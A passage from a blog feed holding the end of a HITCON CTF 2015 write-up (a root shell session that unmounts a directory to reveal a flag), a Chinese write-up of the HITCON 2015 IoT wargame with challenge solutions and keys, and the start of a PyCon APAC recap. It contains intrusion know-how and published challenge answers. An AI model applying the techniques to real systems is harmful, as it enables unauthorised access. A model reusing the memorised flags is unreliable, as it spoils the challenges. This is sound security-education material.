-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 stat  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 swaps  
dr-xr-xr-x   1 nobody nogroup               0 Oct 19 05:26 sys  
--w-------   1 nobody nogroup               0 Oct 19 05:26 sysrq-trigger  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 sysvipc  
lrwxrwxrwx   1 nobody nogroup               0 Oct 19 05:25 thread-self -&amp;gt; 7/task/7  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_list  
-rw-r--r--   1 nobody nogroup               0 Oct 19 05:26 timer_stats  
dr-xr-xr-x   4 nobody nogroup               0 Oct 19 05:26 tty  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 uptime  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 version_signature  
-r--------   1 nobody nogroup               0 Oct 19 05:26 vmallocinfo  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 vmstat  
dr-xr-xr-x   2 nobody nogroup               0 Oct 19 05:26 xen  
-r--r--r--   1 nobody nogroup               0 Oct 19 05:26 zoneinfo  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's take some search.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
grep -r &amp;quot;chest&amp;quot; . 2&amp;gt;/dev/null  
./1/task/1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/task/1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./1/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./1/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/task/2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/task/2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./2/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./2/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
Binary file ./15/task/15/cmdline matches  
./15/task/15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/task/15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
Binary file ./15/cmdline matches  
./15/mounts:/dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d /chest ext4 rw,relatime,discard,data=ordered 0 0  
./15/mountinfo:132 104 202:1 /mnt /chest rw,relatime - ext4 /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d rw,discard,data=ordered  
./15/mountstats:device /dev/disk/by-uuid/2ed4c374-2ddb-4a75-af24-98df753dbf6d mounted on /chest with fstype ext4  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We've already found &lt;code&gt;/chest&lt;/code&gt; before and knew it's empty.&lt;br /&gt;
So, maybe unmount it?  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/proc# umount /chest  
umount /chest  
root@ip-172-31-19-201:/proc# cd /chest  
cd /chest  
root@ip-172-31-19-201:/chest# ls  
ls  
jungle.chest  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;ta da!  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@ip-172-31-19-201:/chest# cat jungle.chest  
cat jungle.chest  
hitcon{Wh1re d!d Y0u F1nd the Jungle Key}  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Stego - unreadable [100]&lt;/h2&gt;
&lt;p&gt;We got a file &lt;a href="/files/hitcon-ctf-2015-quals-write-up/unreadable-4b2868cc26a8dad5695e537a9dd8a164"&gt;unreadable-4b2868cc26a8dad5695e537a9dd8a164&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;by using &lt;code&gt;xxd&lt;/code&gt; to check it.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="unreadable" src="/files/hitcon-ctf-2015-quals-write-up/unreadable.png" /&gt;  &lt;/p&gt;
&lt;p&gt;the flag is &lt;code&gt;hitcon{WE USE XXD INSTEAD OF IDA PRO}&lt;/code&gt;  &lt;/p&gt;</summary><category term="CTF"></category><category term="HITCON"></category><category term="Write-up"></category><category term="Ruby"></category><category term="Conf"></category><category term="Security"></category></entry><entry><title>HITCON 2015 IOT Wargame</title><link href="https://blog.m157q.tw/posts/2015/08/29/hitcon-2015-iot-wargame/" rel="alternate"></link><published>2015-09-03T21:32:19+08:00</published><updated>2015-09-03T21:32:19+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-08-29:posts/2015/08/29/hitcon-2015-iot-wargame/</id><summary type="html">&lt;p&gt;今年的 HITCON 的主題是 IoT，&lt;br /&gt;
所以 Wargame 也配合了 IoT 的主題，&lt;br /&gt;
用 Arduino Nano + Raspberry Pi 出題。  &lt;/p&gt;
&lt;p&gt;Wargame 的網址是 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt;&lt;br /&gt;
&lt;img alt="IOT Wargame" src="/files/hitcon-2015-iot-wargame/iot_wargame.png" /&gt;  &lt;/p&gt;
&lt;h2&gt;Arduino Nano 部份&lt;/h2&gt;
&lt;p&gt;Arduino Nano 的題目只有三題，&lt;br /&gt;
(原本好像有打算出四題的感覺，但可能時間來不及的關係)&lt;br /&gt;
而且難度蠻簡單的，&lt;br /&gt;
其實蠻適合所有會眾入門，&lt;br /&gt;
而且每位會眾報到後都會拿到已經把題目燒進去的 Arduino Nano。&lt;br /&gt;
(還有附排針，但題目不會用到，原本一看到以為要現場焊接XD)&lt;br /&gt;
但參與度好像不高，&lt;br /&gt;
寫這篇文章的當下，&lt;br /&gt;
總計是 243 位註冊帳號，&lt;br /&gt;
其中 161 位至少答對一題，&lt;br /&gt;
三題全部都做完的有 69 位。  &lt;/p&gt;
&lt;p&gt;我自己是在第一天議程結束後的晚上才開始看題目，&lt;br /&gt;
然後大概花3個多小時才把三題都解出來，&lt;br /&gt;
(GeoHot 花了一個多小時就全解完了QQ)&lt;br /&gt;
以下寫一下自己的解法，&lt;br /&gt;
供有興趣的人參考，&lt;br /&gt;
有問題也歡迎回覆。  &lt;/p&gt;
&lt;p&gt;其實題目真的不難，&lt;br /&gt;
真的有在打 Wargame 或 CTF 的人應該覺得簡單到沒必要浪費時間寫 Write-up 吧XD&lt;br /&gt;
但因為身邊還是有人不會寫，&lt;br /&gt;
所以秉持著推廣一下 Wargame 跟 CTF 的精神寫一下這部份，&lt;br /&gt;
Orange 出的 RPi 題目我就解不出來了 XDrz  &lt;/p&gt;
&lt;h3&gt;1. 讓 Arduino Nano 能被你的電腦讀到&lt;/h3&gt;
&lt;p&gt;老實說這應該是最難的部份了，&lt;br /&gt;
因為第一次接觸 Arduino，&lt;br /&gt;
所以我在這上面花蠻多時間的Orz&lt;br /&gt;
IRC 上也很多人在詢問，&lt;br /&gt;
有看到有人在問 Mac, Windows&lt;br /&gt;
就是沒看到有人問 Linux 的，&lt;br /&gt;
(噢，好像有看到有人問 Ubuntu 的?有點忘記了)&lt;br /&gt;
因為我本身用 Arch Linux，&lt;br /&gt;
所以這篇文章會以 Arch Linux 為主，&lt;br /&gt;
(順便偷偷推廣 &lt;a href="https://www.archlinux.org/"&gt;Arch Linux&lt;/a&gt; XD)  &lt;/p&gt;
&lt;p&gt;Windows 的使用者可以參考會眾 toby 寫的教學&lt;br /&gt;
&lt;a href="http://toby.logdown.com/posts/293552/hitcon-play-nano-on-windows"&gt;HITCON 之 Windows 也要玩 Nano « Toby 'n Hack&lt;/a&gt;，&lt;br /&gt;
仍然不行的話，可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/Windows"&gt;Arduino - Windows&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;Mac 的使用者可以參考這篇 &lt;a href="http://arduino.stackexchange.com/questions/5119/arduino-nano-no-serial-port-for-macbook-air-2013"&gt;Arduino Nano no serial port for MacBook Air 2013 - Arduino Stack Exchange&lt;/a&gt; (但有人反應裝了還是讀不到)&lt;br /&gt;
仍然不行的話，也可以看一下官方的 &lt;a href="https://www.arduino.cc/en/Guide/MacOSX"&gt;Arduino - MacOSX&lt;/a&gt; 試試。  &lt;/p&gt;
&lt;p&gt;至於 Linux 的話，可以參考 Arduino 官方的這篇 &lt;a href="http://playground.arduino.cc/Learning/Linux"&gt;Arduino Playground - Linux&lt;/a&gt;。  &lt;/p&gt;
&lt;p&gt;而 Arch Linux 的話，當然就是看官方的 &lt;a href="https://wiki.archlinux.org/index.php/Arduino"&gt;Arduino - ArchWiki&lt;/a&gt;，從 AUR 上安裝 Arduino。  &lt;/p&gt;
&lt;p&gt;(但其實我在還沒安裝 AUR 的 Arduino 時，&lt;br /&gt;
就已經出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 了，&lt;br /&gt;
所以我覺得應該是有 driver 的，&lt;br /&gt;
但我當時還不知道怎麼改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
所以還是裝了 AUR 的 arduino 套件，&lt;br /&gt;
直到看到 &lt;a href="http://playground.arduino.cc/Interfacing/Python"&gt;Arduino Playground - Python&lt;/a&gt;&lt;br /&gt;
才發現是 &lt;code&gt;port&lt;/code&gt; 的值錯了&lt;br /&gt;
才覺得一開始可能不用裝 &lt;code&gt;arduino&lt;/code&gt; 也會動，&lt;br /&gt;
但也懶的移除了。&lt;br /&gt;
所以如果有人也有這樣的情況，然後也還沒裝 arduino 的話，&lt;br /&gt;
可以先試試看直接改 &lt;code&gt;ans.py&lt;/code&gt; 的 port，&lt;br /&gt;
看能不能用，這樣就不用多裝 3xx MB 的 arduino 套件了。&lt;br /&gt;
至於怎麼改 port，下面會提到)  &lt;/p&gt;
&lt;p&gt;如果沒有出現 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 或是試了不成功的話，&lt;br /&gt;
就繼續試試  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;yaourt -S arduino  
sudo gpasswd -a $user uucp  
sudo gpasswd -a $user lock  
sudo gpasswd -a $user tty  
sudo modprobe cdc_acm  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之後，登出再登入。&lt;br /&gt;
ArchWiki 上是說會出現 &lt;code&gt;/dev/ttyACMx&lt;/code&gt; (x 為數字)&lt;br /&gt;
但我的是 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt;，一樣可以正常使用。  &lt;/p&gt;
&lt;p&gt;用 &lt;code&gt;screen /dev/ttyUSB0 115200&lt;/code&gt; 確認有顯示以下內容就是有讀到了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HITCON 2015 NANO GAME  

Nano$ [0] Morse  
Nano$ [1] Maze  
Nano$ [2] Calculator  
Nano$ enter your choice:  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;2. 透過 pip 安裝 pyserial&lt;/h3&gt;
&lt;p&gt;在使用官方提供的 &lt;code&gt;ans.py&lt;/code&gt; 之前，&lt;br /&gt;
記得先安裝必要的套件 &lt;code&gt;pyserial&lt;/code&gt;&lt;br /&gt;
使用 &lt;code&gt;pip install pyserial&lt;/code&gt;&lt;br /&gt;
安裝完後，打開 &lt;code&gt;ans.py&lt;/code&gt;&lt;br /&gt;
將第 67 行的 &lt;code&gt;port=3&lt;/code&gt; 改成 &lt;code&gt;port='/dev/ttyUSB0'&lt;/code&gt;&lt;br /&gt;
(這邊的 &lt;code&gt;/dev/ttyUSB0&lt;/code&gt; 視實際情況更改)&lt;br /&gt;
就可以開始修改 &lt;code&gt;ans.py&lt;/code&gt; 進行 Python Wargame 了(?)  &lt;/p&gt;
&lt;p&gt;修改第 47 行的 choice 可以選擇要解的題目，&lt;br /&gt;
'0' == NANO 1&lt;br /&gt;
'1' == NANO 2&lt;br /&gt;
'2' == NANO 3  &lt;/p&gt;
&lt;p&gt;每個 *.tgz 用 &lt;code&gt;tar zxvf $tgz_file&lt;/code&gt; 解開&lt;br /&gt;
每個裡面的 readme.txt 基本上都一樣的，不太需要看  &lt;/p&gt;
&lt;p&gt;每題拿到 key 之後，&lt;br /&gt;
請複製該 key，&lt;br /&gt;
再到 &lt;a href="http://iot.hitcon.org"&gt;http://iot.hitcon.org&lt;/a&gt; 登入，&lt;br /&gt;
然後點選對應的題目，&lt;br /&gt;
至右下角 &lt;code&gt;enter key&lt;/code&gt; 欄位，&lt;br /&gt;
貼上 key，之後按 send 送出。  &lt;/p&gt;
&lt;p&gt;以下開始講解各題：  &lt;/p&gt;
&lt;h3&gt;NANO 1&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-1.tgz"&gt;NANO 1 原始檔&lt;/a&gt;&lt;br /&gt;
這題會拿到一串&lt;a href="https://zh.wikipedia.org/zh-tw/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81"&gt;摩斯密碼&lt;/a&gt;&lt;br /&gt;
&lt;code&gt;.... .. - -.-. --- -. -. .- -. --- --. .- -- . -- --- .-. ... .&lt;/code&gt;&lt;br /&gt;
隨便找個解摩斯密碼的網站 &lt;a href="http://morsecode.scphillips.com/translator.html"&gt;http://morsecode.scphillips.com/translator.html&lt;/a&gt;&lt;br /&gt;
解碼後得到 &lt;code&gt;HITCONNANOGAMEMORSE&lt;/code&gt;&lt;br /&gt;
把 &lt;code&gt;game0()&lt;/code&gt; 的 &lt;code&gt;answer = ''&lt;/code&gt; 改成 &lt;code&gt;answer = 'HITCONNANOGAMEMORSE'&lt;/code&gt;&lt;br /&gt;
再執行一次 &lt;code&gt;ans.py&lt;/code&gt; 便可得到 key  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 457E1A295B9D1C48&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 2&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-2.tgz"&gt;NANO 2 原始檔&lt;/a&gt;&lt;br /&gt;
這是三題裡面最難的一題，也是三題中最少人解出來的。&lt;br /&gt;
這題要在九秒內走出 &lt;code&gt;14*14&lt;/code&gt; 的迷宮，&lt;br /&gt;
從 &lt;code&gt;(0, 0)&lt;/code&gt; 走到 &lt;code&gt;(14,14)&lt;/code&gt;&lt;br /&gt;
(除非你手速夠快，不然以本題的設計基本上九秒走不完)  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;#39;O&amp;#39; 代表人、&amp;#39;.&amp;#39; 代表路、&amp;#39;+&amp;#39; 代表牆、&amp;#39;X&amp;#39; 代表出口  
&amp;#39;w&amp;#39; 往上走、&amp;#39;a&amp;#39; 往左走、&amp;#39;s&amp;#39; 往下走、&amp;#39;d&amp;#39; 往右走  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;必須修改 &lt;code&gt;game1()&lt;/code&gt; 裡頭的內容，&lt;br /&gt;
把走迷宮的演算法寫在裏面。  &lt;/p&gt;
&lt;p&gt;我用的方法其實是半自動的，在必要的時候需要手動，也不保證每次成功。&lt;br /&gt;
(要全自動的話可能需要用 &lt;a href="https://en.wikipedia.org/wiki/Breadth-first_search"&gt;BFS&lt;/a&gt;，但我太廢，覺得這樣已經能解出題目就夠了。)  &lt;/p&gt;
&lt;p&gt;程式每次會呈獻 3x3 的現在位置地圖，&lt;br /&gt;
因為 'O' 每次的位置不固定，&lt;br /&gt;
所以先找到 'O' 的現在位置後，&lt;br /&gt;
將其紀錄為 &lt;code&gt;pos_x&lt;/code&gt; 和 &lt;code&gt;pos_y&lt;/code&gt;，&lt;br /&gt;
方便之後判斷其上下左右是否可走。  &lt;/p&gt;
&lt;p&gt;再來因為我們要往右下方行走才能到達出口，&lt;br /&gt;
所以就判斷如果 'O' 的右邊(&lt;code&gt;lines[pos_y, pos_x+1]&lt;/code&gt;) 是 '.'(路) 的話就往右走，&lt;br /&gt;
已右邊舉例的話，如果有下列情況的話，就改換下一個優先的方向檢查： (按照 右、下、左、上 的順序)  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;邊界(&lt;code&gt;pos_x == 2&lt;/code&gt;)  (&lt;code&gt;pos_x+ 1&lt;/code&gt; 就超出邊界了)  &lt;/li&gt;
&lt;li&gt;'O' 的右邊是 '+' (牆)  &lt;/li&gt;
&lt;li&gt;上一步是往左走(往反方向走)  &lt;ul&gt;
&lt;li&gt;避免左右左右、上下上下這種不會前進的狀況發生  &lt;/li&gt;
&lt;li&gt;造成了另一個問題，每當走入三面都是牆的洞的時候，就會卡住。  &lt;/li&gt;
&lt;li&gt;這時就會需要手動移動  &lt;/li&gt;
&lt;li&gt;因為要得知上一步，所以我建立了 &lt;code&gt;steps = [None]&lt;/code&gt; 紀錄每一步的順序  &lt;/li&gt;
&lt;li&gt;把每次的移動利用 &lt;code&gt;steps.append()&lt;/code&gt; 紀錄起來  &lt;/li&gt;
&lt;li&gt;並在每次透過 &lt;code&gt;steps[-1]&lt;/code&gt; 得知上一步  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;依此類推，照著 &lt;code&gt;右、下、左、上、手動&lt;/code&gt; 的先後順序，寫出程式碼。&lt;br /&gt;
開始執行後，遇到卡住的狀況就手動控制，試個幾次很快就可以走出迷宮  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 3D52CB746F9E6C83&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;NANO 3&lt;/h3&gt;
&lt;p&gt;&lt;a href="/files/hitcon-2015-iot-wargame/nano/nano-3.tgz"&gt;NANO 3 原始檔&lt;/a&gt;&lt;br /&gt;
這題是必須在一秒內回答四則運算的結果，&lt;br /&gt;
看一下題目，可以發現題目的字串長的像這樣&lt;br /&gt;
&lt;code&gt;Nano$ 7 * 10 - 14 + 6 - 5 - 19 = ?&lt;/code&gt;&lt;br /&gt;
所以可以透過 Regular Expression&lt;br /&gt;
&lt;a href="https://docs.python.org/2/library/re.html"&gt;7.2. re — Regular expression operations — Python 2.7.10 documentation&lt;/a&gt;&lt;br /&gt;
把 &lt;code&gt;7 * 10 - 14 + 6 - 5 - 19&lt;/code&gt; 取出來後&lt;br /&gt;
丟給 &lt;a href="https://docs.python.org/2/library/functions.html#eval"&gt;eval()&lt;/a&gt; 算出結果，&lt;br /&gt;
再把值 assign 給 answer 回答。&lt;br /&gt;
(&lt;code&gt;eval()&lt;/code&gt; 可以把字串當作 expression 進行求值，雖然很方便，但真正在開發程式的時候最好不要亂用，尤其是不要把使用者輸入的資料丟給 &lt;code&gt;eval()&lt;/code&gt;，因為你永遠不知道使用者會輸入什麼奇怪的東西)&lt;br /&gt;
照著這個想法修改一下 &lt;code&gt;game2()&lt;/code&gt;，這題應該就解決了  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Nano$ key is 273A9C1E2D380B48&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;極度建議自己寫程式碼，&lt;br /&gt;
真的真的想不出來的話再點下面的連結吧！&lt;br /&gt;
不然是不會進步的。&lt;br /&gt;
程式碼請見：&lt;a href="https://gist.github.com/M157q/164f9ba5bd8ae0b18afe"&gt;https://gist.github.com/M157q/164f9ba5bd8ae0b18afe&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;然後看到 IRC 有人提到，&lt;br /&gt;
他把 Nano 上的 binary dump 到電腦上，&lt;br /&gt;
直接用 &lt;code&gt;strings&lt;/code&gt; 拿到 3 個 key，&lt;br /&gt;
不知道怎麼做到的&lt;br /&gt;
查了一些關鍵字，會是&lt;code&gt;avr-objdump&lt;/code&gt;嗎?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上直接 dump 的 write-up &lt;a href="http://kb.hitcon.org/post/128246307977/%E7%A7%92%E8%A7%A3-hitcon-nano-%E9%A1%8C"&gt;HITCON Knowledge Base — 秒解 Hitcon Nano 題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;Raspberry Pi 部份&lt;/h2&gt;
&lt;p&gt;有分四題：R0, R1, R2, R4 的題目都不同，都是由 Orange 出題。&lt;br /&gt;
我只有碰 R0 跟 R1 的題目，有些想法，但都沒解出來，以下簡單紀錄。  &lt;/p&gt;
&lt;h3&gt;R0&lt;/h3&gt;
&lt;p&gt;Web 那邊會拿到一個 &lt;a href="/files/hitcon-2015-iot-wargame/rpi/r0/forkyou"&gt;ARM64 的 binary 執行檔&lt;/a&gt;，&lt;br /&gt;
之後用 &lt;code&gt;qemu-aarch64&lt;/code&gt; 的環境就可以執行，&lt;br /&gt;
聽說還蠻簡單的，可是我還是解不出來QQ&lt;br /&gt;
似乎有在某處看到 &lt;code&gt;/bin/sh -c&lt;/code&gt; 之類的呼叫，&lt;br /&gt;
應該是利用 BOF 把 EIP 指到那邊就可以拿到 shell 了?  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;補上 R0 write-up &lt;a href="http://kb.hitcon.org/post/127947378507/hitcon-2015-iot-wargame-r0-%E6%8C%91%E6%88%B0%E9%A1%8C"&gt;HITCON Knowledge Base — HITCON 2015 IoT Wargame – R0 挑戰題&lt;/a&gt;  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;R1&lt;/h3&gt;
&lt;p&gt;連進去是 Discuz! X3.2&lt;br /&gt;
查了一下，有 remote shell execute 漏洞:&lt;br /&gt;
&lt;a href="http://drops.wooyun.org/papers/4611"&gt;DiscuzX系列命令执行分析公开（三连弹） | WooYun知识库&lt;/a&gt;&lt;br /&gt;
照著做之後，&lt;br /&gt;
找不到在 &lt;code&gt;data/attachment&lt;/code&gt; 底下符合權限的圖片來編輯，&lt;br /&gt;
(最近重灌，還沒裝 DirBuster 或是 Burp Suite，所以沒暴力掃底下有哪些東西...)&lt;br /&gt;
無法觸發 picwidth 的 Remote Shell Excution 漏洞，&lt;br /&gt;
感覺方向應該是對的吧？&lt;br /&gt;
這題是四題裏面沒被人解出來的。&lt;br /&gt;
(GeoHot 把其他三題都解掉了...)  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;這次的 Wargame 大概就是這樣吧，&lt;br /&gt;
果然實力還是不夠，&lt;br /&gt;
HST 的 Wargame 拿到 reversed.txt 裡頭一串 ...---.. 後也沒啥想法。  &lt;/p&gt;
&lt;p&gt;會把 Nano 的部份寫的這麼詳細的原因，&lt;br /&gt;
是因為想要推廣大家玩一下 Wargame 吧！&lt;br /&gt;
(覺得有趣的話就可以來打 CTF 了)&lt;br /&gt;
畢竟上面也講了，這次 Wargame 真的不算難，&lt;br /&gt;
而將近 1000 人的會眾，只有不到 300 人註冊，只有 161 人有拿到分，&lt;br /&gt;
這比例實在有點少。&lt;br /&gt;
再加上幾天前在 Facebook 上看到有人說 Nano 一片一片燒，燒到手快斷了，&lt;br /&gt;
覺得這麼少人玩實在有點可惜。  &lt;/p&gt;
&lt;p&gt;處理好 Arduino Nano 跟電腦連接之後，&lt;br /&gt;
基本上就是寫 Python Code，&lt;br /&gt;
所以我才戲稱是 Python Wargame，&lt;br /&gt;
但其實沒學過 Python 的人藉著這個機會學一下 Python 也不錯，&lt;br /&gt;
畢竟因為 Python 的方便性，很多 exploit 都用 Python 寫了。  &lt;/p&gt;
&lt;p&gt;總之，這篇就是一個小廢物的流水帳。&lt;br /&gt;
有問題歡迎留言討論，但我不一定會就是T_T。  &lt;/p&gt;</summary><category term="CTF"></category><category term="HITCON"></category><category term="Arduino"></category><category term="Python"></category><category term="Raspberry Pi"></category><category term="Write-up"></category><category term="Conf"></category></entry><entry><title>PyCon APAC 2015 Notes and Thoughts</title><link href="https://blog.m157q.tw/posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/" rel="alternate"></link><published>2015-07-26T15:25:54+08:00</published><updated>2015-07-26T15:25:54+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-07-26:posts/2015/07/26/pycon-apac-2015-notes-and-thoughts/</id><summary type="html">&lt;p&gt;這次是第二次參加 PyCon，&lt;br /&gt;
與其像去年當個沒做事的 Web 組冗員，&lt;br /&gt;
還是乖乖當個會眾就好，&lt;br /&gt;
但還是有義務幫忙一些簡單的小事啦。  &lt;/p&gt;
&lt;p&gt;相較於上次參加，&lt;br /&gt;
這一年中也對 Python 更加瞭解了一些，&lt;br /&gt;
但仍然有很多地方不足，&lt;br /&gt;
但至少今年的議程中，&lt;br /&gt;
能夠聽懂的議程比較多了。  &lt;/p&gt;
&lt;p&gt;今年的議程中，&lt;br /&gt;
感覺偏硬的講題變多了，&lt;br /&gt;
似乎是件好事，&lt;br /&gt;
不然很多人提到 Python 都覺得只有 Django, Flask, Bottle, Tornado, ... 之類的 Web 應用&lt;br /&gt;
或是 Numpy, Scipy 之類的科學運算。&lt;br /&gt;
其實 Security 的部分也越來越常看見 exploit 是用 Python 寫的，&lt;br /&gt;
只是可能比較難在 PyCon 出現吧，&lt;br /&gt;
應該都出現在 HITCON。&lt;br /&gt;
但今年的講題真的是比去年還富有多樣性就是。  &lt;/p&gt;
&lt;p&gt;而今年印象最深刻的議程是 Scott Tsai 講 GDB 掛 Python hook 做 Debug 那場，&lt;br /&gt;
講者的英文在我耳裡聽起來跟 native speaker 一樣， 非常流利。&lt;br /&gt;
現場直接 Live Demo 也非常嫻熟，真的很厲害。  &lt;/p&gt;
&lt;p&gt;除了議程之外，最讓我印象深刻的絕對是第二天晚上的夜市。  &lt;/p&gt;
&lt;p&gt;晚餐的自助吧菜色非常多，可以吃得很飽。&lt;br /&gt;
再加上很棒的管樂隊演奏（宇宙戰艦大和號、龍貓、...），&lt;br /&gt;
還有其他的音樂表演，然後各個攤位自己舉辦的各種活動。  &lt;/p&gt;
&lt;p&gt;因為一開始就被拉去 Code Fight 的攤位，&lt;br /&gt;
然後跟 dv 被抓去當第一題的白老鼠，還被拍了照，&lt;br /&gt;
然後就一直待在那邊玩，所以印象最深的也只有 Code Fight。&lt;br /&gt;
結果我跟 dv 很糗的第一題都沒在時間內解出來，還在那邊耗很久的時間，&lt;br /&gt;
用別人的電腦真的很不習慣啊！&lt;br /&gt;
好吧，其實只是太廢的藉口，回去得多練練功。&lt;br /&gt;
但這活動真的很有趣，一堆工程師宅宅在現場解題目，玩得不亦樂乎，希望明年還會有。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="code fight" src="/files/pycon-apac-2015-notes-and-thoughts/code-fight.jpg" /&gt;&lt;br /&gt;
source: &lt;a href="https://www.facebook.com/photo.php?fbid=10206661768324121&amp;amp;set=a.1209323314476.2032355.1270526425&amp;amp;type=1"&gt;https://www.facebook.com/photo.php?fbid=10206661768324121&amp;amp;set=a.1209323314476.2032355.1270526425&amp;amp;type=1&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;附上 Code Fight 的 GitHub Repo (有興趣的人可以去貢獻題目XD)  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/ccwang002/pyapac_code_fighter"&gt;ccwang002/pyapac_code_fighter · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Badge System &amp;amp; Bingo 令我印象深刻的程度僅次於 Night Party。  &lt;/p&gt;
&lt;p&gt;由於今年的 Badge 是 RFID card，&lt;br /&gt;
在各個廠商攤位以及會議室的門口都有 RPi 做好的 RFID Reader，&lt;br /&gt;
會眾到贊助廠商的攤位可以 Check-in，&lt;br /&gt;
一方面是讓廠商得到你的 email，之後可以寄送一些廣告或者是徵才訊息給你，&lt;br /&gt;
另一方面是官方做了一個&lt;a href="http://www.codeme.cc/pycon/badges/?kktix=2015"&gt;Badge System&lt;/a&gt;，&lt;br /&gt;
每個廠商的攤位 Check-in 都會有成就可以解鎖，&lt;br /&gt;
而每場議程也都可以 Check-in，&lt;br /&gt;
然後根據解鎖的成就數量，會影響到最後一天 Bingo 活動起始的格子數。  &lt;/p&gt;
&lt;p&gt;因為我解鎖了不少成就，&lt;br /&gt;
所以在最後一天的 Bingo 活動中幸運的得到了 PyCarm 一年份的序號，&lt;br /&gt;
雖然平常還是都在用 Vim 就是。  &lt;/p&gt;
&lt;p&gt;&lt;img alt="pycharm" src="/files/pycon-apac-2015-notes-and-thoughts/pycharm.jpg" /&gt;  &lt;/p&gt;
&lt;blockquote&gt;
